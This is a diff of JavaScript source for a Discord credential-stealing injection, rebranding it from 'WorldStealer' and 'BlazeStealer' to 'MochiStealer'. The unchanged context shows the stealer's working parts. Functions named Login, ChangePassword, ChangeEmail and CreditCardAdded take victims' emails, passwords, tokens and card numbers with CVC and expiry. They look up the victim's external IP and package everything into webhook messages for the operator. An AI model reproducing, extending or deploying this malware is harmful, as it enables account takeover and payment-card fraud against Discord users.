@@ -239,10 +239,10 @@ async function FirstTime() {
                         ip
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     const c = {
-                        username: "@WorldStealer",
+                        username: "@MochiStealer",
                         content: "",
                         embeds: [{
-                            title: "World Injection",
+                            title: "Mochi Injection",
                             color: FFFFE0,
                             fields: [{
                                 name: "Injection Results !",
@@ -250,7 +250,7 @@ async function FirstTime() {
                                 inline: !1
 							}],
                             author: {
-                                name: "@WorldStealer | Forged by 1336 end Blaze"
+                                name: "@MochiStealer | Forged by Frxddy end Hakim"
                             }
 						}]
                     };
@@ -266,18 +266,18 @@ async function FirstTime() {
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     
                     if(b.avatar === null){
-                        usericonurl = "https://cdn.discordapp.com/icons/1125358065676451840/e235e96303b793f64f5d77e78c55e723.webp?size=1024"
+                        usericonurl = "https://cdn.discordapp.com/attachments/1126546777252843550/1127545460098355200/photo_2023-07-06_21-52-32.jpg"
                     }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                     if(b.banner === null){
-                        bannerurl = "https://cdn.discordapp.com/icons/1125358065676451840/e235e96303b793f64f5d77e78c55e723.webp?size=1024"
+                        bannerurl = "https://cdn.discordapp.com/attachments/1126546777252843550/1127545460098355200/photo_2023-07-06_21-52-32.jpg"
                     }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
-                        username: "@WorldStealer",
+                        username: "@MochiStealer",
                         content: "",
                         embeds: [{
-                            title: "WorldStealer, Powered By WorldInc.",
+                            title: "MochiStealer, Powered By MochiInc.",
                             description: `${b.username}'s account`,
-                            color: FFFFE0,
+                            color: 00FF7F,
                             fields: [ {
                                 name: ":mag_right: User ID",
                                 value: `\`${b.id}\``,
@@ -322,7 +322,7 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             const c = {
-                                username: "@WorldStealer",
+                                username: "@MochiStealer",
                                 content: "",
                                 embeds: [{
                                     title: "WorldStealer, Powered By WorldInc.",
@@ -720,17 +720,17 @@ async function Login(email, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://cdn.discordapp.com/icons/1125358065676451840/e235e96303b793f64f5d77e78c55e723.webp?size=1024"
+                usericonurl = "https://cdn.discordapp.com/attachments/1126546777252843550/1127545460098355200/photo_2023-07-06_21-52-32.jpg"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://cdn.discordapp.com/icons/1125358065676451840/e235e96303b793f64f5d77e78c55e723.webp?size=1024"
+                bannerurl = "https://cdn.discordapp.com/attachments/1126546777252843550/1127545460098355200/photo_2023-07-06_21-52-32.jpg"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
             
             const params = {
-                username: "@WorldStealer",
+                username: "@MochiStealer",
                 content: "",
                 embeds: [{
-                    "title": "WorldStealer User Login",
+                    "title": "MochiStealer User Login",
                     description: `${info.username}'s account`,
                     "color": FFFFE0,
                     "fields": [{
@@ -855,12 +855,12 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 }
                 return billing
             }
-            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://cdn.discordapp.com/icons/1125358065676451840/e235e96303b793f64f5d77e78c55e723.webp?size=1024";
+            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://cdn.discordapp.com/attachments/1126546777252843550/1127545460098355200/photo_2023-07-06_21-52-32.jpg";
             const params = {
-                username: "@WorldStealer",
+                username: "@MochiStealer",
                 content: "",
                 embeds: [{
-                    "title": "WorldStealer Password Changed",
+                    "title": "MochiStealer Password Changed",
                     description: `${info.username}'s account`,
                     "color": FFFFE0,
                     "fields": [{
@@ -986,19 +986,19 @@ async function ChangeEmail(newemail, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://cdn.discordapp.com/icons/1125358065676451840/e235e96303b793f64f5d77e78c55e723.webp?size=1024"
+                usericonurl = "https://cdn.discordapp.com/attachments/1126546777252843550/1127545460098355200/photo_2023-07-06_21-52-32.jpg"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://cdn.discordapp.com/icons/1125358065676451840/e235e96303b793f64f5d77e78c55e723.webp?size=1024"
+                bannerurl = "https://cdn.discordapp.com/attachments/1126546777252843550/1127545460098355200/photo_2023-07-06_21-52-32.jpg"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
 
             
            const params = {
-                username: "@WorldStealer",
+                username: "@MochiStealer",
                 content: "",
                 embeds: [{
-                    "title": "WorldStealer Email Changed",
+                    "title": "MochiStealer Email Changed",
                     description: `${info.username}'s account`,
                     "color": FFFFE0,
                     "fields": [{
@@ -1066,18 +1066,18 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         ip
     } = await getFromURL("https://www.myexternalip.com/json", null)
         if(info.avatar === null){
-            usericonurl = "https://cdn.discordapp.com/icons/1125358065676451840/e235e96303b793f64f5d77e78c55e723.webp?size=1024"
+            usericonurl = "https://cdn.discordapp.com/attachments/1126546777252843550/1127545460098355200/photo_2023-07-06_21-52-32.jpg"
         }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
         if(info.banner === null){
-            bannerurl = "https://cdn.discordapp.com/icons/1125358065676451840/e235e96303b793f64f5d77e78c55e723.webp?size=1024"
+            bannerurl = "https://cdn.discordapp.com/attachments/1126546777252843550/1127545460098355200/photo_2023-07-06_21-52-32.jpg"
         }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
         
         const params = {
-            username: "BlazeStealer",
+            username: "@MochiStealer",
             content: "",
             embeds: [{
-                "title": "BlazeStealer Credit Card Added",
+                "title": "MochiStealer Credit Card Added",
                 "description": `
                 **IP:** ${ip}\n\n
                 **Username**\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
@@ -1093,7 +1093,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
             },
                 {
                     "title": `Guilds Owner`,
-                    "color": FFFFE0,
+                    "color": 00FF7F,
                     "description": `\`\`\`diff\n${fs.readFileSync('hq_guilds.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
 
                     "thumbnail": {
